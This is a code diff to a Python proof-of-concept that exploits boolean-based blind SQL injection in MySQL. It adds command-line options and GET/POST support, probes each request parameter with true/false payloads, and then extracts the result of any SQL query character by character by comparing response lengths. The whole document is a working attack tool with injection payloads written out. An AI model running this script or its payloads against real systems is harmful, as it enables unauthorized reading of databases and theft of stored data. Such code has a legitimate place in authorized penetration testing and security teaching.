@@ -1,46 +1,64 @@
 import sys
 import requests
+import argparse
+from urllib.parse import parse_qsl
 
-def sqli(entry_point, inj_str, true_len):
+def response_length(data, param, payload):
+    data[param]=payload
+    if args['method'] == 'GET':
+        result = requests.get(args['url'], params=data)
+    elif args['method'] == 'POST':
+        result = requests.post(args['url'], data=data)
+    return int(result.headers['Content-Length'])
+
+
+def sqli(data, vulnerable_param, inj_str, true_len):
     # search for characters in printable ASCII range
     for j in range(32, 126): 
-        target = entry_point + inj_str.replace("[CHAR]", str(j)) 
-        r = requests.get(target)
+        payload = inj_str.replace("[CHAR]", str(j))
         # Checking response for boolean answer
         # In case query text will be inserted into response, result might be greater than True measured length
-        if int(r.headers['Content-Length']) >= true_len :
+        if response_length(data, vulnerable_param, payload) >= true_len :
             return j 
     return None
 
-def sqli_true_len(entry_point):
-    target = entry_point + "test')/**/or/**/(select/**/1)=1%23"
-    r = requests.get(target)
-    return int(r.headers['Content-Length'])
-
-def sqli_false_len(entry_point):
-    target = entry_point + "test')/**/or/**/(select/**/0)=1%23"
-    r = requests.get(target)
-    return int(r.headers['Content-Length'])
-
 def main():
-    if len(sys.argv) != 3:
-        print('(+) usage example: {} "http://localhost?param=" "select version()"'.format(sys.argv[0]))
-    entry_point = sys.argv[1]
-    query = sys.argv[2].replace(' ', '/**/')
-    # making assumption that True and False answers has different Content-Length header and True>False
-    true_len=sqli_true_len(entry_point)
-    false_len=sqli_false_len(entry_point)
+    usage_example='''Usage example:
+
+    python3 mysql_bb_poc.py --url 'http://localhost/user' --method 'GET' --param='username' --sql="select version()"'''
+    parser = argparse.ArgumentParser(description='Exploit boolean based blind SQL injection in MySQL', epilog=usage_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument('--url', help="Attacking URL", required=True)
+    parser.add_argument('--sql', help='SQL query to execute', required=True)
+    parser.add_argument('--data', help='Request parametrs in form of query string', required=True)
+    parser.add_argument('--method', help='HTTP method. GET and POST are supported.', required=True)
+
+    global args
+    args = vars(parser.parse_args())
+    query = args['sql'].replace(' ', '/**/')
+    data=dict(parse_qsl(args['data']))
+    # checking all params from data
+    for param in data:
+        print('Checking parametr {}...'.format(param))
+        # making assumption that True and False answers has different Content-Length header and True>False
+        true_len=response_length(data, param, "test')/**/or/**/(select/**/1)=1%23")
+        false_len=response_length(data, param, "test')/**/or/**/(select/**/0)=1%23")
+        if true_len>false_len:
+            print('(+) Parametrs {} is vulnerable. Starting the injection'.format(param))
+            vulnerable_param = param
+            break
     if (true_len==false_len):
         print('(-) Entry point is not vulnerable to injection')
         sys.exit()
+    #guessing each character from SQL query result
     i = 1
     while True:
         injection_string = "test')/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]%23".format( query, i )
         try:
-            extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
+            extracted_char = chr(sqli(data, vulnerable_param, injection_string, true_len)) 
             print(extracted_char, end='', flush=True)
             i+=1
         except TypeError:
+            #end of result string
             break
     print("\n(+) done!")
 
